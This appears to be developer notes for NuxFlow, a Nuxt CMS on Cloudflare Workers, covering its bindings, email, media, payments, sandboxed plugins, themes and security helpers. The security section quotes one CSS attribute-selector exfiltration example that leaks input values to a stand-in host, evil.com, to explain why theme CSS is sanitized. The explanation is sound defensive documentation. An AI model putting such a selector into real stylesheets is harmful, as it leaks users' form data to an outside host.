**REVISIT — isolated app/server type-checking:** Nuxt's own docs say the current single-program setup (`apps/nuxflow/tsconfig.json` extending `.nuxt/tsconfig.json`) is a legacy pattern slated for replacement by TypeScript project references (root `tsconfig.json` gaining a `references` array pointing at `.nuxt/tsconfig.server.json` etc.), which would properly isolate app and server type-checking — the architecturally correct end state. Not adopted yet because it currently hits open upstream bugs on this Nuxt version: broken auto-import resolution and crashes under `vue-tsc -b` (nuxt/cli#1224, nuxt/nuxt#34212, nuxt/nuxt#35319). The tradeoff and the fix already applied for it are noted inline in `apps/nuxflow/tsconfig.json`. To check whether it's safe to switch: bump Nuxt, add a `references` array to `apps/nuxflow/tsconfig.json` pointing at the generated sub-configs, run `pnpm typecheck`, and see if those issues are actually fixed upstream.

`server/utils/cf-env.ts` — typed accessors for Cloudflare bindings:
- `getCfBindings(event)` → `{ kv, loader, r2 }` — `PLUGIN_KV`, `LOADER`, and `MEDIA_BUCKET` bindings (see Media system below for the R2 provider that uses `r2`)
- `getAnalyticsEngine(event)` → `AE` Analytics Engine binding (null when not available)
- KV key conventions: `plugin:{siteId}:{pluginId}:server|client`, `theme:{siteId}:{themeId}:css:v{cssVersion}|demo` — the CSS key is versioned (see Theme system below); `demo` is not.
- `spawnPluginWorker(event, cacheId, getCode)` — spawns a dynamic plugin Worker via the `LOADER` binding. Returns `globalOutbound: null` in the worker's code object, so plugin code has **no** outbound network access — it can only use whatever bindings it's explicitly given (currently none; no `env` is passed either). See https://developers.cloudflare.com/dynamic-workers/usage/egress-control/.

Dynamic plugins require the Cloudflare Workers Paid plan. Without it the `LOADER` binding is absent and dynamic plugins 503.

`server/utils/analytics.ts` — `trackPageView(event, { siteId, slug })` writes a data point to the `AE` binding (no-ops silently when binding is absent). Called automatically from the public pages API.

**`wrangler.toml` config notes:** custom domains must be declared via `[[routes]]` with `custom_domain = true` — if a domain is configured in the Cloudflare dashboard but not in `wrangler.toml`, Wrangler will warn about config drift and offer to remove it on every deploy. The `[assets]` section serves static files from `.output/public` and must be present for the built frontend to be served.

### Rate limiting

`server/utils/rate-limit.ts` — `rateLimit(event, opts)` is a two-tier check:
1. Isolate-level memory cache (instant, no DB)
2. DB upsert for cross-isolate consistency

### Settings system

`server/utils/settings.ts` — `resolveSetting(event, key, envKey?)` reads a site setting: DB first, falls back to `runtimeConfig[envKey]`. `saveSetting(event, key, value)` writes it. Keys listed in `SENSITIVE_SETTING_KEYS` (API keys, passwords) are automatically encrypted with AES-GCM using `betterAuthSecret` before writing and decrypted on read — never store or compare these in plaintext. There is a 30 s in-memory cache per isolate to avoid redundant DB reads; the cache is cleared automatically on save.

### Email

`server/utils/email.ts` — `sendEmail(event, msg)` dispatches email through the provider configured in site settings. Supported providers:
- `cloudflare` (**recommended**) — Cloudflare's native `send_email` Workers binding (`getEmailBinding()` in `cf-env.ts`). No third-party account or API key; requires `wrangler email sending enable <domain>` once per sending domain and a `[[send_email]]` binding named `EMAIL` in `wrangler.toml`.
- `resend`, `brevo`, `zepto` — third-party API-key providers.
- `smtp` — actually MailChannels, not generic SMTP. MailChannels' free anonymous relay for Cloudflare Workers requires an existing MailChannels account and DNS domain-lockdown records as of mid-2024 — most self-hosters won't have this. There is no host/user/pass to configure (MailChannels authorizes via sender-domain DNS, not credentials) — don't reintroduce those fields, they were removed because they never did anything.

Defaults to `console` log in dev when no provider is configured. Use `sendNotification()` from `server/utils/notify.ts` to persist an in-app notification and optionally send email in one call.

**Email verification** — `better-auth.ts`'s `emailVerification.sendVerificationEmail` is wired up (same per-site provider resolution as `sendResetPassword`, factored into a shared `resolveSiteEmailSettings()` helper) and triggered explicitly from `server/api/public/auth/register.post.ts` right after a self-registered account is created — `auth.api.sendVerificationEmail()` is a direct in-process call, not a self-fetch, so it doesn't hit the Workers self-fetch-timeout issue that already ruled out calling Better Auth's own sign-up endpoint from that route (see the comment there). Deliberately **not enforced**: `emailAndPassword` has no `requireEmailVerification` flag, and `sendOnSignUp` is deliberately omitted from the `emailVerification` config too. Every existing row in every existing deployment has `emailVerified=false` (there was no way to set it `true` before this), so a hard login block would lock out every current user, including site admins, the moment this ships — that's a call for the operator to make deliberately, not a side effect of adding the capability. `sendOnSignUp` specifically would also double-email a brand-new invitee: `server/api/v1/users/index.post.ts` already creates their account via `auth.api.signUpEmail()` and immediately sends its own "set your password" email — invited users already prove email ownership by clicking that link, so a second "verify your email" email pointing at a login they can't use yet would recreate the dead-end that invite flow's own comments explicitly call out avoiding.

### Media system

**Provider abstraction** — `server/utils/media-providers/index.ts` exports `getActiveProvider(event): Promise<MediaProvider>`. Priority order: Cloudflare Images → R2 → S3 → Bunny → local (base64 data URI fallback). R2 (`server/utils/media-providers/r2.ts`) is Cloudflare's own object storage — zero egress fees, no third-party account — accessed via the optional `MEDIA_BUCKET` R2 bucket binding (see `wrangler.toml.example`) rather than access keys, so it needs only a public URL setting (`media.r2_public_url` / `NUXT_R2_PUBLIC_URL`) alongside the binding, since R2 buckets are private by default. The other real providers (Cloudflare Images, S3, Bunny) are resolved identically via `resolveSetting(event, 'media.xxx', 'xxxRuntimeConfigKey')` — per-site DB setting first, `NUXT_`-prefixed env var fallback second — so a multi-site install can give different sites different buckets/zones, not just one global env var shared by every site. Configurable in Settings → Media, which writes to the same per-site settings `resolveSetting()` reads. The `MediaProvider` interface has `upload()`, `delete()`, and `getUrl()`. All image upload endpoints call `getActiveProvider()` rather than touching a specific storage SDK directly. The local fallback caps uploads at 512 KB (base64 stored directly in a D1 text column) and throws 413 above that — it's a last-resort path for when nothing else is configured, not a supported way to serve normal media.

**EXIF extraction** — `server/utils/exif.ts` exports `extractExif(buffer: ArrayBuffer): ExifData | null`. Pure Web APIs, zero dependencies. Reads IFD0 (Make, Model) and ExifIFD (exposure, ISO, focal length, flash, dateTimeOriginal) from JPEG APP1 segments. Returns `null` for non-JPEG files or images with no EXIF. The upload handler calls this after a successful provider upload and stores the result in `media.metadata` as `{ exif: {...} }`. Errors are swallowed so they never fail the upload.

**Cloudflare Stream video uploads** — `POST /api/v1/media/video/token` calls the Cloudflare Stream `direct_upload` API and returns `{ uploadUrl, uid }`. The browser then POSTs the file directly to `upload.cloudflarestream.com` via XHR (for progress events). The authenticated TUS endpoint lacks CORS headers and cannot be used from browsers. A 402 is returned when the account has no Stream minutes allocated (CF error code 10011) — the Workers Paid plan does not include Stream storage.

### AI providers

`server/utils/ai-sdk.ts` — `getAiSdkModel(event, quality)` returns an AI SDK `LanguageModel` for the provider configured in site settings (`ai.provider`). Supported providers: `openai`, `anthropic`, `gemini`, `deepseek`, `ollama`. Quality is `'fast'` (default) or `'smart'`, which selects a smaller vs larger model per provider. Returns `null` when the provider API key is missing — callers are expected to throw 503 on `null`. Use `aiErrorMessage(err)` to extract a user-friendly message from provider SDK errors.

This is the only AI abstraction in the codebase — every route calls `getAiSdkModel()` plus `generateText()`/`generateObject()` from the `ai` package directly (see `generate-content.post.ts` for the `generateText` pattern, `grammar.post.ts` for `generateObject` with a Zod schema). There used to be a second, hand-rolled `AiProvider` interface (`ai-providers/`) used only by the simple single-string-completion routes; it was removed since `getAiSdkModel` + `generateText` covers that exact case with no loss of capability — don't reintroduce a parallel abstraction for "simple" completions.

AI routes in `server/api/v1/ai/`:
- `POST /improve` — rewrites a text field (improve / shorten / expand / simplify). Called by the canvas `FieldRenderer` inline AI menu.
- `POST /bulk-alt-text` — queues AI-generated alt text for multiple media items. Returns a processing status; the admin media page polls until done.

### Payments and memberships

Payment providers are abstracted in `server/utils/payments/`:
- `StripeProvider` — products, prices, checkout sessions, billing portal, subscription cancel, webhook event construction
- `LemonSqueezyProvider` — products, variants, checkout, portal, cancellation, webhook HMAC verification
- `PaddleProvider` — subscription fetch/cancel, Ed25519 webhook verification, and checkout via `createTransaction()` (Paddle's Transactions API — `POST /transactions` with `items`/`custom_data`/`checkout.url`, returning a hosted `data.checkout.url` to redirect the browser to, same shape of outcome as Stripe's checkout session or LS's checkout). No `createProduct`/price-sync equivalent — Paddle prices/products are managed in the Paddle dashboard, not synced from NuxFlow.

All three `implements PaymentProvider` (`payments/types.ts`) for the one operation genuinely identical across all three: `cancelSubscription(subscriptionId)`. Checkout creation and product/price sync are deliberately **not** part of that shared interface — all three drive checkout through their own API and return a hosted URL, but each takes different inputs (customer id vs. email vs. nothing) and Paddle's is a transaction rather than a session, so forcing a common shape there would misrepresent the difference rather than remove real duplication.

`server/utils/payments/webhook-sync.ts` — `upsertSubscriptionFromWebhook()` and `cancelSubscriptionFromWebhook()` hold the DB-write logic (tier lookup, existing-row check, insert/update, activation push) that used to be duplicated three times in the webhook handler. Each provider's webhook handler only parses its own raw payload into a `SubscriptionUpsert`/`SubscriptionCancellation` and calls the shared function — `pushOnActivation` is computed per-provider since each vocabulary differs on which specific event type should trigger a push (e.g. Lemon Squeezy/Paddle only push on their "created"/"activated" event, not "updated"/"resumed", even though those share the same upsert path).

Content gating logic lives inline as `checkContentAccess()` in `apps/nuxflow/server/api/public/pages/[slug].get.ts` (not a separate `server/utils/payments/` module) — it checks `settings.access` (`'public'`, `'members'`, `'tier:<tierId>'`) against the caller's active subscription (requiring `status === 'active'` and an unexpired `currentPeriodEnd`) and returns a blocked-access result or `null` (null = access granted).

Membership tiers and subscriptions live in the core DB schema (`packages/db/src/schema/payments.ts`).

Routes under `/api/v1/memberships/`:
- `POST /checkout` → creates a provider checkout session, returns `{ url }`
- `POST /billing-portal` → opens the provider billing portal, returns `{ url }`
- `DELETE /api/v1/account/subscription` → cancels the caller's active subscription (skips provider API for free-tier subs whose `providerSubscriptionId` starts with `free_`)
- `POST /webhooks/[provider]` → Stripe/LS/Paddle webhook handler; upserts `subscriptions` rows and optionally sends a push notification via `push.events.payment_confirmation` setting

The public pages API returns **HTTP 402** with `{ gated: true, requiredTier, tiers }` when content requires a subscription the caller doesn't hold. `app/pages/[...slug].vue` catches this in `onResponseError` and renders `<Paywall :tiers="gated.tiers" />`. Member-only pages also set `Cache-Control: private` to prevent CDN caching.

### Plugin system

**Dynamic plugins** are third-party Workers stored in KV and spawned on demand. A plugin is a `nuxflow.plugin.json` manifest plus `src/server.ts` (a raw `{ fetch(request) }` Cloudflare Worker handler, served at `/_nuxflow/ext/{pluginId}/*`), `src/blocks.json` (plain-data Canvas block metadata — id/name/icon/fields/defaultProps, read directly by the trusted app, never executed), and/or `src/client.ts` (exports a `renderBlock(blockId, vue)` function returning the Vue component for a given block id). Plugin authors are explicitly told not to import from `@nuxflow/*` and to inline their own copies of the small shared type shapes instead, so there is no shared SDK package for this — see `packages/cli/src/utils/scaffold.ts` for the exact generated contract. The server verifies Ed25519 signatures and SHA-256 checksums (now covering all three artifacts — server code, client code, and block definitions) on install and on every request (`server/utils/plugin-signing.ts`).

**Client-side sandboxing** — `src/client.ts` never executes in the main app. `renderBlock()` only ever runs inside a per-block-instance `<iframe sandbox="allow-scripts">` (deliberately omitting `allow-same-origin`, which gives the iframe an opaque origin: no cookies, no localStorage, and any `fetch()` it makes is credential-less and cross-origin even against this same domain). The iframe's document is generated by `server/routes/_nuxflow/plugin-frame/[pluginId]/[...blockName].get.ts`, loads a self-hosted Vue runtime build (`server/routes/_nuxflow/vendor/vue-runtime.js.get.ts`, sourced from a checked-in copy under `server/assets/vendor/` via `nitro.serverAssets` — Workers has no filesystem access at request time, so it can't be read from `node_modules` directly), and communicates with the parent page purely via `postMessage` (props in, rendered height out — see `app/components/PluginBlockFrame.vue`). The `_nuxflow/plugin-bundle/[id].ts` and `_nuxflow/ext/[pluginId]/[...path].ts` routes both set `Access-Control-Allow-Origin: *` for exactly this reason — calls from the sandboxed iframe are cross-origin even though they're same-domain. This is why block *metadata* (`src/blocks.json`) is split from block *rendering* (`src/client.ts`): the Canvas block picker needs a block's name/icon/fields before any instance of it is ever rendered, and there's no live iframe to ask at that point — metadata has to be readable by the trusted app directly, so it's authored as inert JSON instead of being extracted from executed code.

### Canvas block system

Block definitions live in `packages/canvas/src/blocks/definitions.ts`. The file exports a `CANVAS_BLOCKS` array (all built-in blocks) plus `getBlockDefinition(id)`, which searches `CANVAS_BLOCKS` first, then falls back to a dynamic plugin's own registered definition via `resolveDefinition()`. Dynamic plugins declare their block field schemas as plain JSON in `src/blocks.json` (see "Plugin system" above) — `app/plugins/dynamic-plugins.client.ts` reads that directly and calls `registry.register(id, { component, definition, ... })` (`useBlockRegistry.ts`) once per declared block, with `component` always being the same generic sandboxed `PluginBlockFrame` wrapper, never plugin-authored code running in this context.

**`CanvasBlockDefinition`** (from `packages/canvas/src/types.ts`) has:
- `fields: FieldSchema[]` — each field has `type`, `key`, `label`, and optional `condition?: (props) => boolean` to hide the field based on sibling prop values. Use `condition` for dependent controls (e.g. focal-point sliders only when `fit === 'cover'`).
- Field types: `'text'`, `'textarea'`, `'richtext'`, `'number'`, `'color'`, `'select'`, `'toggle'`, `'image'`, `'images'` (JSON array of `{ url, alt }` objects), `'url'`, `'spacing'` (`{ top, right, bottom, left, unit }` object).
- `category` determines which section of the block picker shows the block: `'content'`, `'media'`, `'layout'`, `'cta'`, `'forms'`, `'advanced'`, `'commerce'`.
- `component: string` — globally-registered Vue component name resolved at render time.

**`NuxLightbox`** (`packages/canvas/src/blocks/NuxLightbox.vue`) — modal image viewer. Accepts `images: { url, alt }[]` and `initialIndex`. Supports keyboard navigation (←/→/Esc) and touch. Used by both `CanvasBlockImage` (single-image lightbox toggle) and `CanvasBlockGallery` (gallery with optional lightbox).

**`CanvasBlockGallery`** (`packages/canvas/src/blocks/CanvasBlockGallery.vue`) — responsive grid block with `columns` (2/3/4), `gap`, `rounded`, `lightbox`, and `padding` props. The `images` prop is a JSON string of `{ url, alt }[]`.

**Registering a new block**: add its `CanvasBlockDefinition` to `CANVAS_BLOCKS` in `definitions.ts`, create its `.vue` component in `packages/canvas/src/blocks/`, import and register the component globally in `nuxflow-plugin-components.ts`, and add a test case in `tests/unit/canvas-blocks.test.ts`.

**CLI** (`packages/cli`) — the `nuxflow` CLI is used by third-party plugin/theme authors:
- `nuxflow plugin create` — scaffold a new dynamic plugin
- `nuxflow plugin keygen` — generate an Ed25519 publisher keypair (private key stays local, public key embedded in `nuxflow.plugin.json`)
- `nuxflow plugin build` — bundle `src/server.ts` + `src/client.ts` to `dist/plugin.json`
- `nuxflow plugin deploy --site <url>` — sign and install a plugin on a live site
- `nuxflow plugin update --site <url>` — remove old version and reinstall
- `nuxflow theme` — analogous commands for custom themes

### Theme system

Themes are CSS files stored in KV under a *versioned* key (`theme:{siteId}:{themeId}:css:v{cssVersion}`, `themes.cssVersion` in `packages/db/src/schema/system.ts`, bumped atomically by `putThemeCSS()` in `cf-env.ts` on every publish). Publishing to a fixed key would be visible unevenly for up to ~2 minutes afterward — a compounding of this Worker's own 60s per-isolate CSS cache (`theme-cache.ts`) and Cloudflare KV's own eventual-consistency propagation lag on *other* isolates/colos that already had a warm cache entry for the old content. Versioning the key sidesteps the KV half of that: a re-read of a key that has only ever been written once can never observe a stale value, so only the isolate-cache TTL remains as the (single, well-understood) staleness window. The active theme's CSS is injected as an inline `<style data-nuxflow-theme>` block during SSR via the `render:html` hook in `server/plugins/theme-resolver.ts` — no extra HTTP round-trip and no flash on first paint. This is a deliberate architecture choice, not a limitation to work around: Nuxt layers resolve at build time (`extends`), so they can't be swapped per-request in one deployed Worker the way this needs (many tenants, each on a different theme, switched instantly with no redeploy); and letting third-party themes ship server-rendered components would need the same trust machinery already built for dynamic plugins (Ed25519 signing, sandboxed execution) for no real gain over CSS. `themes/default/assets/css/theme.css` is the canonical reference for every token/selector a theme can use — it's a plain CSS file, not a Nuxt layer (there is no `themes/*` package the app `extends`).

**Visual Customizer** (`Admin → Themes → Open customizer`, `pages/admin/themes/customize.vue`) generates its own CSS from point-and-click controls and publishes it as a theme (`POST /api/v1/themes/customizer`). Its KV entry holds *only* the CSS it generates — never merged with a base bundled theme's CSS at publish time. The base theme (tracked via the `theme.base_theme_id` setting) stays live and is injected as a separate, earlier `<style>` block by `theme-resolver.ts`, so editing the base theme later takes effect immediately with no need to re-publish the customizer, and the customizer's explicit choices reliably win the cascade over whatever defaults the base theme declares.

`server/plugins/site-settings-resolver.ts` injects appearance settings into SSR HTML on the same hook:
- `theme.dark_mode` → blocking inline `<script>` that adds/removes the `dark` class before paint
- `theme.primary_color` → `--nuxflow-primary` CSS custom property (injected everywhere, including admin)
- `theme.font_sans` → `--nuxflow-font` CSS property + Google Fonts `<link>`; `'system'` skips injection

Admin pages skip dark-mode and font injection (the admin has its own colour-mode toggle).

**Theme preview** (`POST /api/v1/themes/:id/preview`) returns a URL with `?__theme_id=` that lets an admin view an inactive theme without activating it. `server/middleware/theme-preview.ts` only sets the preview cookie for an authenticated admin (or higher) **of the current site** — it does not accept the query param from an unauthenticated visitor.

**Layout regions (structural theming)**: CSS can restyle the built-in header/footer but can't replace their markup. A dynamic plugin can register a block (the same `registry.register()` used for Canvas blocks — see `docs/plugins.md`'s "Structural theming" section) and be designated in `Admin → Themes → Layout regions` (settings `layout.header_block` / `layout.footer_block`, exposed via `GET /api/public/site`) to render in place of `PublicSiteHeader`/`PublicSiteFooter` in `app/layouts/default.vue`. This is the intended extension point for anything CSS can't reach — not a reason to reintroduce Nuxt-layer themes. Falls back to the built-in components when unset or unresolved, so it's purely additive; the fallback is also what the SSR (and initial client) render shows for a plugin-provided block, since `resolve()` only returns dynamic-plugin components after their async client bundle loads, well after hydration completes — avoiding a hydration mismatch the same way `NuxBlocks.vue` already does for individual blocks.

### Security utilities

`server/utils/security.ts` — use these for any endpoint that fetches external URLs, processes archives, or stores theme CSS:
- `isSafeUrl(urlStr)` — SSRF guard; returns `false` for private/loopback IPv4, private IPv6, `localhost`, `.local`, `.internal`, and non-HTTP(S) schemes
- `validateZipArchive(data, maxUncompressedSize)` — parses the ZIP central directory without decompressing; throws 400 on path traversal (Zip Slip) and 413 on Zip Bomb; returns `{ fileCount, totalSize }`
- `sanitizeThemeCss(css)` — strips `url()`, `@import`, `expression()`, and `</style>` from theme CSS before it's stored or injected. Theme CSS never legitimately needs external resources (fonts/images go through dedicated settings), so these are stripped outright rather than allow-listed — this closes the CSS attribute-selector exfiltration technique (`input[value^="a"] { background: url(https://evil.com/?a) }` leaks DOM attribute values with no JS needed). Called from the single write chokepoint `putThemeCSS()` in `cf-env.ts` (covers all 3 upload/patch/customizer routes automatically) and again at SSR injection time in `theme-resolver.ts` (idempotent — retroactively protects CSS stored before this existed, no data migration needed).

### Frontend routing

Public pages are rendered by `app/pages/[...slug].vue`. The page fetches `/api/public/pages/:slug`, which first checks the `redirects` table (returning a 3xx if matched), then branches on content type:
- `content.type === 'canvas'` → full-width `<NuxBlock>`, blocks handle their own layout
- Otherwise → contained prose layout with featured image, author/date meta, `<NuxBlock>`, share buttons
- **402 response** → member-gated content; `onResponseError` captures `{ gated, requiredTier, tiers }` and renders `<Paywall>` instead of the page

Other public routes:
- `/blog` (`app/pages/blog/index.vue`) — paginated post index; fetches `GET /api/public/posts`
- `/search` (`app/pages/search.vue`) — FTS5 full-text search via `GET /api/v1/search`; no auth required
- `/[taxonomySlug]/[termSlug]` — taxonomy archive with pagination; fetches `GET /api/public/taxonomy/:taxonomy/:term`
- `/feed.xml` — RSS 2.0 feed with `<content:encoded>` full HTML for TipTap posts
- `/sitemap-images.xml` (`server/routes/sitemap-images.xml.ts`) — Google Image sitemap extension; lists all `image/%` media for the site with `<image:title>` (altText) and `<image:caption>`. Uses `seo.canonical_url` setting as the base URL. Cached for 1 hour.

`GET /api/public/pages/:slug` returns `{ ..., author: { name, image } | null, excerpt }` in addition to the base fields. The author is looked up from the `users` table via `contentItems.authorId`.

Admin pages live in `app/pages/admin/`. Super-admin-only pages (e.g. multi-site management) live under `app/pages/admin/super/` and are linked in the sidebar only when `/api/v1/users/me` returns `isSuperAdmin: true`. The super admin site-deletion API (`DELETE /api/v1/admin/sites/:id`) blocks deletion of the site currently being accessed (`event.context.siteId`). Pinia stores in `app/stores/` manage auth (`auth.ts`) state — a thin wrapper around `useAuth.ts`'s session composable. There is no content store; content-editing state lives in the editor page's local reactive form plus `@nuxflow/canvas`'s own `useCanvas()`.

### App utilities (Vue-only scope)

`app/utils/render-tiptap.ts` — converts a TipTap/ProseMirror JSON document to an HTML string. **This file is scoped to the Vue app bundle and cannot be imported from Nitro server routes.** Server-side code (e.g. `server/routes/feed.xml.ts`) must contain its own serializer or use a shared package if one is added.

### Nuxt config notes

- `ssr: true` and `nitro.preset: 'cloudflare-module'` unconditionally — dev only ever runs through `wrangler dev`, which always performs a production-mode build, so there's no separate dev-mode code path to special-case. (The old NODE_ENV-conditional split existed because `nuxt dev` was previously also a supported dev path and its Vite dev-server pipeline crashed on Windows with a Named Pipe IPC bug in `@nuxt/vite-builder@4.4.2 + Vite 7.3.x` — see nuxt/nuxt#34727. That path no longer exists, so the workaround was removed with it. If `nuxt dev` is ever reintroduced, re-check whether that upstream bug is still live before dropping the conditional again.)
- `@opentelemetry/api` is stubbed via `nitro.alias` because Better Auth imports it optionally but it is not installed
- Migrations SQL files are bundled via `nitro.serverAssets`
- `nitro.experimental.tasks: true` is required for the `server/tasks/` system to function

### Integration test helpers

`apps/nuxflow/tests/helpers/` — shared utilities for integration tests:
- `db.ts` — `initTestDb()` / `teardownTestDb()` / `getCurrentTestDb()` — manages a real SQLite (libSQL) database per test file
- `event.ts` — `createMockEvent(overrides)` — builds a minimal H3 event with `siteId`, session, headers, and body
- `seed.ts` — one insert per table: `seedSite`, `seedUser`, `seedRole`, `seedContentType`, `seedContentItem`, `seedTier`, `seedSubscription`, `seedMedia`, `seedVideoAsset`, `seedSetting`

Integration tests mock `../../server/utils/db` to return `getCurrentTestDb()` and mock payment provider classes (Stripe/LS/Paddle) to avoid real network calls. They use `vitest.integration.config.ts` (separate from `vitest.config.ts` which covers unit tests only) and run sequentially via `pool: 'forks', singleFork: true` to prevent SQLite file conflicts.

## Commit convention

This project follows [Conventional Commits](https://www.conventionalcommits.org): `feat:`, `fix:`, `docs:`, `refactor:`, `test:`, `chore:`. Commitlint runs in CI.

## Git & Deployment Workflow

Before staging, committing, or pushing any changes to GitHub, **always** perform the following verification steps locally:
1. **Linter**: Run `pnpm lint` and ensure there are 0 ESLint errors.
2. **Typecheck**: Run `pnpm typecheck` and ensure the TypeScript compiler is 100% green.
3. **Unit Tests**: Run `pnpm test` to guarantee zero regressions on serverless routes or business logic.
4. **E2E Tests**: If modifying critical dashboard forms or routing logic, run E2E specs to ensure Edge Worker compatibility.
